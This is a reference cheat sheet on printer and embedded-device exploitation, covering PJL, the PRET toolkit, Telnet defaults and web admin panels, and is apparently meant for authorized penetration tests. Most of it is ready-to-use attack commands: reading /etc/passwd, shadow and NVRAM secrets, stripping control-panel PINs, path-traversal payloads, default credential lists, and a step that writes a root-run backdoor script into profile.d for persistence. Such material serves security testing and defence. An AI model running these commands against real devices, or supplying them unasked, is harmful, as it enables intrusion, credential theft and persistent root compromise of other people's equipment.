# Peripheral Protocol Attacks

Reference for printer/peripheral network management protocol exploitation in authorized assessments.

---

## PJL (Printer Job Language)

### Protocol overview

PJL is HP's bidirectional control language for switching print languages and querying printer state. It is exposed on TCP 9100 (raw print socket), TCP 515 (LPD), and TCP 631 (IPP), and also via HTTP POST forms in embedded web management UIs. No authentication required by default on most implementations.

### PRET — Printer Exploitation Toolkit

PRET automates PJL (and PostScript/PCL) attacks against network printers.

```bash
# Install
git clone https://github.com/RUB-NDS/PRET && cd PRET && pip3 install -r requirements.txt

# PJL mode (HP, Lexmark, others)
python3 pret.py <target> pjl

# Key PRET commands:
# ls, cd, get, put — filesystem navigation and file access
ls /
get /etc/passwd
get /webServer/default/csconfig

# id, pwd — device identity and current directory
id
pwd

# nvram dump — read NVRAM (printer password, settings)
nvram dump

# Display message on printer panel
display "Owned by Red Team"
```

### Manual PJL command reference

Send commands via netcat to TCP 9100, or via HTTP POST (field name `pjl`) on managed printer UIs.

| Command | Purpose |
|---------|---------|
| `@PJL INFO ID` | Returns printer model string |
| `@PJL INFO STATUS` | Current printer status |
| `@PJL FSDIRLIST NAME="0:\" ENTRY=1 COUNT=65535` | List printer filesystem root |
| `@PJL FSQUERY NAME="<path>"` | Return size/type of a file (use before FSUPLOAD to size the read) |
| `@PJL FSUPLOAD NAME="<path>" OFFSET=0 SIZE=<n>` | Read a file from the printer filesystem (OFFSET required per HP PJL spec) |
| `@PJL FSDOWNLOAD FORMAT:BINARY SIZE=<n> NAME="<path>"` | Write a file (SIZE precedes NAME; body follows the command) |
| `@PJL INQUIRE CPLOCK` | Read control panel lock PIN |
| `@PJL NVRAM DUMP` | Dump full NVRAM (HP/Lexmark) |
| `@PJL SET CPLOCK=0` | Remove control panel PIN |

### Filesystem path mapping (HP LaserJet)

The PJL filesystem volume `0:` maps to a directory on the underlying OS (commonly `/printer`, `/hpmnt`, or similar). Path traversal via `../` accesses the host filesystem:

```
0:/                              → /printer/ (PJL root)
0:/../../                        → / (filesystem root)
0:/../../etc/passwd              → /etc/passwd
0:/../../home/default/readyjob   → JetDirect boot job file (PINs, credentials)
0:/webServer/default/csconfig    → ChaiServer config
```

### High-value targets in printer filesystem

| Path | Content |
|------|---------|
| `0:/../../home/default/readyjob` | JetDirect boot job — `@PJL COMMENT` and `@PJL SET` fields often contain cleartext PINs or usernames |
| `0:/../../etc/passwd` / `shadow` | Device OS user accounts |
| `0:/../../etc/` | Network config, keys, init scripts |
| `0:/webServer/default/csconfig` | ChaiServer web config — document root, auth settings |
| `0:/webServer/home/` | Embedded web UI assets |
| `0:/saveDevice/SavedJobs/` | Stored print jobs (may contain sensitive documents) |
| NVRAM (via PRET `nvram dump`) | All persistent settings including security PINs, passwords |

### Path traversal shell persistence (Lexmark pattern)

On Lexmark devices, path traversal allows writing files to the host filesystem's `profile.d`:

```bash
# Write a reverse shell init script (authorized lab only)
@PJL FSDOWNLOAD FORMAT:BINARY SIZE=<n> NAME="0:/../../rw/var/etc/profile.d/backdoor.sh"
<shell script content of exactly n bytes>
# On next reboot, the script executes as root during device init
```

### PostScript path (PRET ps mode)

```bash
python3 pret.py <target> ps
# Commands: ls, get, put, id, execute (run arbitrary PostScript)
```

---

## Telnet / Serial-over-LAN defaults

Many embedded devices expose a root shell over Telnet with default or no credentials.

```bash
nmap -p 23 <subnet>/24 --open
telnet <target>

# Common defaults to try:
# root:(empty)   admin:admin   admin:password   root:root
# root:admin     root:1234     admin:1234
```

---

## Embedded HTTP admin panel

```bash
# Fingerprint and crawl
curl -sv http://<target>/
nikto -h http://<target>

# Directory traversal via web interface (complement PJL traversal)
curl "http://<target>/cgi-bin/info.cgi?file=../../etc/passwd"
curl "http://<target>/?path=../../../../etc/shadow"

# Default admin credential endpoints
/admin/, /management/, /config, /setup, /cgi-bin/admin.cgi
```

---

## Resources

- PRET GitHub: https://github.com/RUB-NDS/PRET
- Hacking Printers wiki (PJL, PostScript, PCL reference): http://hacking-printers.net/wiki/
- NCC Group Lexmark PJL traversal analysis: https://research.nccgroup.com/2022/02/18/analyzing-a-pjl-directory-traversal-vulnerability-exploiting-the-lexmark-mc3224i-printer-part-2/
